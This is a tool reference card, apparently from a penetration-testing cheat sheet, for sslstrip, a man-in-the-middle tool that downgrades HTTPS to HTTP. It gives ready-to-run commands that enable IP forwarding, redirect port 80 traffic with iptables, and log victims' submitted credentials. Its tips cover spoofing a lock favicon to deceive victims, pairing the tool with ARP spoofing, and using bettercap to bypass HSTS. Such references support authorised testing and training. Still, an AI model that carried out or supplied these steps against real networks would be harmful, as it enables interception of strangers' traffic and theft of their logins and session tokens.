# sslstrip

- **Category**: Sniffing & Spoofing / SSL Stripping
- **Risk Level**: 🔴 High

---

## Description

> **Note**: This project is archived/unmaintained. Modern browsers with HSTS preloading largely mitigate this attack. Kept for legacy testing and educational purposes.

A MITM attack tool that transparently downgrades HTTPS connections to HTTP. Sits between the victim and the server: it maintains HTTPS connections to the server but serves plain HTTP to the victim, stripping SSL/TLS encryption. Intercepts HTTP 301/302 redirects and HTTPS links in HTML responses, replacing them with HTTP equivalents. Captures credentials and session tokens that victims submit over the now-unencrypted connection.

## Installation

```bash
sudo apt install sslstrip
```

## Parameter Reference

| Parameter | Description |
|-----------|-------------|
| `-l <port>` | Port to listen on (default: 10000) |
| `-w <file>` | Write intercepted data to log file |
| `-a` | Log all SSL/HTTP traffic (verbose) |
| `-f` | Substitute a lock favicon to make HTTP appear as HTTPS |
| `-k` | Kill existing sessions to force re-authentication |
| `-p` | Log only SSL POST data |

## Common Commands

```bash
# Enable IP forwarding
echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward

# Redirect HTTP traffic to sslstrip via iptables
sudo iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000

# Start sslstrip with logging
sudo sslstrip -l 10000 -w sslstrip.log

# Start sslstrip with lock favicon spoofing
sudo sslstrip -l 10000 -f -w sslstrip.log

# Log only POST data (credentials)
sudo sslstrip -l 10000 -p -w credentials.log

# Clean up iptables rule after testing
sudo iptables -t nat -D PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
```

## Notes & Tips

1. HSTS-enabled websites are resistant to sslstrip — modern browsers cache HSTS policies and refuse unencrypted connections. Use `bettercap` with HSTS bypass caplets for those targets.
2. Always enable IP forwarding and set up iptables redirect before starting sslstrip.
3. Combine with ARP spoofing (`arpspoof`, `bettercap`, or `ettercap`) to position yourself as MITM.
4. The `-f` flag replaces the site favicon with a lock icon, providing a false sense of security to the victim.
5. sslstrip is a legacy tool — for modern engagements, `bettercap`'s built-in `hstshijack` caplet provides more comprehensive HTTPS downgrade capabilities.

---

## Official References

- [sslstrip (GitHub)](https://github.com/moxie0/sslstrip)
- [Kali sslstrip](https://www.kali.org/tools/sslstrip/)
